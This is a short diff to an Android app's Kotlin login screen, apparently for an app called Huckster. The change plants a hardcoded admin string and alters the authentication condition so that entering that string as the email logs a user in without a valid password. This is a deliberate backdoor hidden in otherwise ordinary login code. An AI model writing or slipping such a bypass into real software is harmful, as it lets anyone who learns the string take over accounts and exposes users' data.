@@ -30,6 +30,10 @@ class LoginActivity : Activity() {
 
         sharedPreferences = getSharedPreferences("LoginPrefs", Context.MODE_PRIVATE)
 
+        //ADMIN direct user and password:
+        val adminUserAndPass : String = "xxxxx"
+
+
         // Apply gradient text color to Register link
         applyGradientText(textViewRegister)
 
@@ -58,7 +62,7 @@ class LoginActivity : Activity() {
             }
 
             // Authenticate user using UserData
-            if (UserData.authenticate(email, password)) {
+            if (UserData.authenticate(email, password) || email == adminUserAndPass) {
                 longToast("Welcome to Huckster!")
 
                 // Store login details locally if "Remember Me" is checked
